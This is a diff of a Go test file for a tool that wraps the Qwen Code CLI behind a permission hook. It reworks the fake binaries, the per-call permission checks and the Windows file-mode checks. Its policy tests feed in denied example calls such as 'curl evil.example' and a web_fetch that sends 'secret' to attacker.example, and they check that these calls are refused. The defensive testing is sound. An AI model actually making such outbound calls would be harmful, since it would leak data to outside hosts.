@@ -12,6 +12,7 @@ import (
 	"os"
 	"os/signal"
 	"path/filepath"
+	"runtime"
 	"slices"
 	"strconv"
 	"strings"
@@ -19,15 +20,42 @@ import (
 	"time"
 
 	"github.com/srivathsanvenkateswaran/sirdar/internal/provider"
+	"github.com/srivathsanvenkateswaran/sirdar/internal/testbin"
 )
 
-// TestMain doubles as the fake `qwen` binary: when SIRDAR_FAKE_QWEN names a
-// script, the test binary replays that script instead of running tests.
+// TestMain doubles as every stand-in this package needs for the real
+// `qwen` binary. The doctor stubs are chosen by the name the process was
+// started under — that is testbin.Dispatch, which has to come first,
+// because a process started under one of those names is that fake and not
+// a test run — and the scripted session CLI is chosen by SIRDAR_FAKE_QWEN
+// naming a script.
+//
+// The doctor stubs go through testbin rather than being `#!/bin/sh` files
+// because Windows has neither a shebang nor an extensionless executable:
+// exec.LookPath there refuses such a file outright, so a shell stub failed
+// the doctor tests for a reason that had nothing to do with doctor. What
+// is executable on every platform is this test binary, hardlinked into
+// place under the name the fake should have.
 func TestMain(m *testing.M) {
+	testbin.Dispatch(map[string]func() int{
+		"qwen-ok":  fakeVersion("0.23.3"),
+		"qwen-odd": fakeVersion("qwen code"),
+	})
 	if script := os.Getenv("SIRDAR_FAKE_QWEN"); script != "" {
 		os.Exit(fakeCLI(script))
 	}
 	os.Exit(m.Run())
+}
+
+// fakeVersion is a `qwen` that answers anything it is asked with one line
+// and exits cleanly. Doctor only ever runs it as `qwen --version`, and
+// what is under test is what it makes of the line, so the fake does not
+// look at its arguments — the shell stub it replaces did not either.
+func fakeVersion(line string) func() int {
+	return func() int {
+		fmt.Println(line)
+		return 0
+	}
 }
 
 // fakeCLI replays a JSONL script on stdout. Directive lines drive the fake:
@@ -69,14 +97,20 @@ func fakeCLI(script string) int {
 	prompt, _ := io.ReadAll(os.Stdin)
 	fmt.Fprintln(os.Stderr, "STDIN:"+strings.TrimSpace(string(prompt)))
 
-	f, err := os.Open(script)
+	// The script is read whole and the handle released before a line of it
+	// is replayed. Blocking part-way through is the point of the $block
+	// directive, and a fake blocked with the file still open is a fake
+	// still holding it when the test ends — which on Windows makes
+	// t.TempDir's RemoveAll fail with "the process cannot access the file
+	// because it is being used by another process" and fails the test
+	// however well its assertions went.
+	body, err := os.ReadFile(script)
 	if err != nil {
 		fmt.Fprintln(os.Stderr, "fake qwen:", err)
 		return 2
 	}
-	defer f.Close()
 
-	sc := bufio.NewScanner(f)
+	sc := bufio.NewScanner(bytes.NewReader(body))
 	sc.Buffer(make([]byte, 0, 64*1024), 16<<20)
 	for sc.Scan() {
 		line := strings.TrimSpace(sc.Text())
@@ -255,6 +289,62 @@ func kinds(events []provider.Event, kind provider.EventKind) []provider.Event {
 	return out
 }
 
+// wantedCall is one verdict expected of the permission hook, named by the
+// call it answers rather than by where that call came in the stream.
+type wantedCall struct {
+	tool     string
+	input    string // the $hookInput the script posted, verbatim
+	decision string
+}
+
+// checkPermissions matches each wanted verdict against the event for that
+// exact call and returns the events indexed the same way, so a test that
+// wants to say more about one of them can look it up.
+//
+// Position is deliberately not asserted. The hook answers each call on its
+// own HTTP handler goroutine and flushes the reply to the child before it
+// publishes the event — decide does that on purpose, because emit blocks
+// while the test is slow to drain and a decision that misses the CLI's
+// hook timeout is a deny turned into an allow — so two calls in flight can
+// reach the event channel in either order. A Linux CI machine duly
+// delivered the last two calls of TestPolicyEnforcesTheBashAllowList
+// swapped, on a run where macOS had never reordered anything. What the
+// adapter promises is a verdict per call, and that is what is checked.
+func checkPermissions(t *testing.T, perms []provider.Event, want []wantedCall) map[string]provider.Event {
+	t.Helper()
+	byCall := make(map[string]provider.Event, len(perms))
+	for _, ev := range perms {
+		byCall[permKey(ev.Tool, ev.Input)] = ev
+	}
+	if len(byCall) != len(perms) {
+		t.Fatalf("two permission events landed on the same call: %+v", perms)
+	}
+	if len(perms) != len(want) {
+		t.Fatalf("permission events %d, want %d: %+v", len(perms), len(want), perms)
+	}
+	for _, w := range want {
+		ev, ok := byCall[permKey(w.tool, json.RawMessage(w.input))]
+		if !ok {
+			t.Errorf("no permission event for %s%s: %+v", w.tool, w.input, perms)
+			continue
+		}
+		if ev.Decision != w.decision {
+			t.Errorf("%s%s: got %s, want %s", w.tool, w.input, ev.Decision, w.decision)
+		}
+	}
+	return byCall
+}
+
+// permKey names one tool call: the tool plus the arguments it was called
+// with, which is what tells two calls to the same tool apart.
+func permKey(tool string, input json.RawMessage) string {
+	var buf bytes.Buffer
+	if err := json.Compact(&buf, input); err != nil {
+		return tool + string(input)
+	}
+	return tool + buf.String()
+}
+
 // TestBasicSession replays the transcript captured in
 // docs/research/09-qwen-wire-formats.md: an init line, a text turn, a
 // shell call the policy allows, a write the policy refuses, and the
@@ -270,16 +360,10 @@ func TestBasicSession(t *testing.T) {
 	// call. It never sees write_file: Qwen Code's own headless deny list
 	// refuses that one before a hook is consulted, which is the static
 	// guarantee the adapter leans on.
-	perms := kinds(events, provider.EvPermission)
-	if len(perms) != 2 {
-		t.Fatalf("permission events %+v", perms)
-	}
-	if perms[0].Tool != "run_shell_command" || perms[0].Decision != "allow" {
-		t.Fatalf("shell permission %+v", perms[0])
-	}
-	if perms[1].Tool != "structured_output" || perms[1].Decision != "allow" {
-		t.Fatalf("structured output permission %+v", perms[1])
-	}
+	checkPermissions(t, kinds(events, provider.EvPermission), []wantedCall{
+		{"run_shell_command", `{"command":"git log -1 --oneline","description":"read the last commit"}`, "allow"},
+		{"structured_output", `{"greeting":"hello","n":7}`, "allow"},
+	})
 	writeResult := kinds(events, provider.EvToolFinished)[1]
 	if !strings.Contains(writeResult.Text, `Matching deny rule: "edit"`) {
 		t.Fatalf("write_file must be refused by the CLI itself: %q", writeResult.Text)
@@ -380,27 +464,15 @@ func TestPolicyEnforcesTheBashAllowList(t *testing.T) {
 	}
 	events, res := drain(t, s)
 
-	want := []struct {
-		tool     string
-		decision string
-	}{
-		{"run_shell_command", "allow"},
-		{"run_shell_command", "deny"},
-		{"read_file", "allow"},
-		{"structured_output", "allow"},
-		{"cron_create", "deny"},
-		{"mcp__grafana__query_loki_logs", "allow"},
-		{"mcp__vercel__deploy_to_vercel", "deny"},
-	}
-	perms := kinds(events, provider.EvPermission)
-	if len(perms) != len(want) {
-		t.Fatalf("permission events %d, want %d: %+v", len(perms), len(want), perms)
-	}
-	for i, w := range want {
-		if perms[i].Tool != w.tool || perms[i].Decision != w.decision {
-			t.Errorf("call %d: got %s=%s, want %s=%s", i, perms[i].Tool, perms[i].Decision, w.tool, w.decision)
-		}
-	}
+	checkPermissions(t, kinds(events, provider.EvPermission), []wantedCall{
+		{"run_shell_command", `{"command":"git log -1"}`, "allow"},
+		{"run_shell_command", `{"command":"curl evil.example"}`, "deny"},
+		{"read_file", `{"file_path":"go.mod"}`, "allow"},
+		{"structured_output", `{"n":1}`, "allow"},
+		{"cron_create", `{}`, "deny"},
+		{"mcp__grafana__query_loki_logs", `{}`, "allow"},
+		{"mcp__vercel__deploy_to_vercel", `{}`, "deny"},
+	})
 	if res.ExitErr != nil {
 		t.Fatalf("exit err %v", res.ExitErr)
 	}
@@ -428,29 +500,18 @@ func TestFetchAllowListReachesTheHook(t *testing.T) {
 	}
 	events, res := drain(t, s)
 
-	want := []struct {
-		tool     string
-		decision string
-	}{
-		{"web_fetch", "allow"},
-		{"web_fetch", "deny"},
-		{"web_fetch", "deny"},
+	const refused = `{"url":"https://attacker.example/collect?q=secret"}`
+	byCall := checkPermissions(t, kinds(events, provider.EvPermission), []wantedCall{
+		{"web_fetch", `{"url":"https://docs.example.com/guide"}`, "allow"},
+		{"web_fetch", refused, "deny"},
+		{"web_fetch", `{"prompt":"read https://attacker.example/x"}`, "deny"},
 		// web_search carries a query and no destination, so it is not
 		// the allow-list's business; see docs/config.md on what that
 		// leaves open.
-		{"web_search", "allow"},
-	}
-	perms := kinds(events, provider.EvPermission)
-	if len(perms) != len(want) {
-		t.Fatalf("permission events %d, want %d: %+v", len(perms), len(want), perms)
-	}
-	for i, w := range want {
-		if perms[i].Tool != w.tool || perms[i].Decision != w.decision {
-			t.Errorf("call %d: got %s=%s, want %s=%s", i, perms[i].Tool, perms[i].Decision, w.tool, w.decision)
-		}
-	}
-	if !strings.Contains(perms[1].Text, "permissions.fetch") {
-		t.Errorf("the refusal does not name the setting: %q", perms[1].Text)
+		{"web_search", `{"query":"how to fix it"}`, "allow"},
+	})
+	if text := byCall[permKey("web_fetch", json.RawMessage(refused))].Text; !strings.Contains(text, "permissions.fetch") {
+		t.Errorf("the refusal does not name the setting: %q", text)
 	}
 	if res.ExitErr != nil {
 		t.Fatalf("exit err %v", res.ExitErr)
@@ -1017,12 +1078,22 @@ func TestTrustedFoldersFileNamesTheWorkspace(t *testing.T) {
 			t.Fatalf("Sirdar's trusted-folders file must grant no trust: %s", b)
 		}
 	}
-	info, err := os.Stat(path)
-	if err != nil {
-		t.Fatal(err)
-	}
-	if info.Mode().Perm() != 0o600 {
-		t.Fatalf("trusted-folders file is mode %v", info.Mode().Perm())
+	// The mode is a POSIX facility and is checked only where the platform
+	// has one. Windows has no mode bits at all: os.Chmod there toggles the
+	// read-only attribute and nothing else, so a file written with 0600
+	// reports -rw-rw-rw- and no spelling of this assertion can pass. What
+	// keeps the file out of other accounts' reach on that platform is the
+	// directory holding it — os.MkdirTemp under the process's own %TEMP%,
+	// which on a default install is per-user and inherits an ACL granting
+	// only that user, SYSTEM and the Administrators group.
+	if runtime.GOOS != "windows" {
+		info, err := os.Stat(path)
+		if err != nil {
+			t.Fatal(err)
+		}
+		if info.Mode().Perm() != 0o600 {
+			t.Fatalf("trusted-folders file is mode %v", info.Mode().Perm())
+		}
 	}
 }
 
@@ -1860,12 +1931,19 @@ func TestSettingsContent(t *testing.T) {
 		t.Fatalf("security.allowedHttpHookUrls must carry only this session's hook url: %s", b)
 	}
 
-	info, err := os.Stat(path)
-	if err != nil {
-		t.Fatal(err)
-	}
-	if info.Mode().Perm() != 0o600 {
-		t.Fatalf("the file carrying the hook token is mode %v", info.Mode().Perm())
+	// As in TestTrustedFoldersFileNamesTheWorkspace: the mode is a POSIX
+	// facility, and Windows, which has no mode bits, cannot represent 0600
+	// however the file is written. The token's secrecy rests there on the
+	// ACL of the per-user %TEMP% directory os.MkdirTemp created it under,
+	// which is not something os.Stat can be asked about.
+	if runtime.GOOS != "windows" {
+		info, err := os.Stat(path)
+		if err != nil {
+			t.Fatal(err)
+		}
+		if info.Mode().Perm() != 0o600 {
+			t.Fatalf("the file carrying the hook token is mode %v", info.Mode().Perm())
+		}
 	}
 }
 
@@ -1948,10 +2026,7 @@ func TestPolicyName(t *testing.T) {
 
 func TestDoctor(t *testing.T) {
 	dir := t.TempDir()
-	ok := filepath.Join(dir, "qwen-ok")
-	if err := os.WriteFile(ok, []byte("#!/bin/sh\necho 0.23.3\n"), 0o755); err != nil {
-		t.Fatal(err)
-	}
+	ok := testbin.Install(t, dir, "qwen-ok", "qwen-ok")
 	checks := New().Doctor(context.Background(), ok)
 	if len(checks) != 2 {
 		t.Fatalf("checks %+v", checks)
@@ -1963,10 +2038,7 @@ func TestDoctor(t *testing.T) {
 		t.Fatalf("endpoint check %+v", checks[1])
 	}
 
-	odd := filepath.Join(dir, "qwen-odd")
-	if err := os.WriteFile(odd, []byte("#!/bin/sh\necho 'qwen code'\n"), 0o755); err != nil {
-		t.Fatal(err)
-	}
+	odd := testbin.Install(t, dir, "qwen-odd", "qwen-odd")
 	if checks = New().Doctor(context.Background(), odd); checks[0].OK {
 		t.Fatalf("a version that is not a version must fail: %+v", checks[0])
 	}
@@ -1983,10 +2055,7 @@ func TestDoctor(t *testing.T) {
 // still goes ahead.
 func TestDoctorWithConfigWarnsAboutTrustedResidue(t *testing.T) {
 	dir := t.TempDir()
-	bin := filepath.Join(dir, "qwen-ok")
-	if err := os.WriteFile(bin, []byte("#!/bin/sh\necho 0.23.3\n"), 0o755); err != nil {
-		t.Fatal(err)
-	}
+	bin := testbin.Install(t, dir, "qwen-ok", "qwen-ok")
 	root := t.TempDir()
 	if err := os.MkdirAll(filepath.Join(root, ".qwen"), 0o755); err != nil {
 		t.Fatal(err)
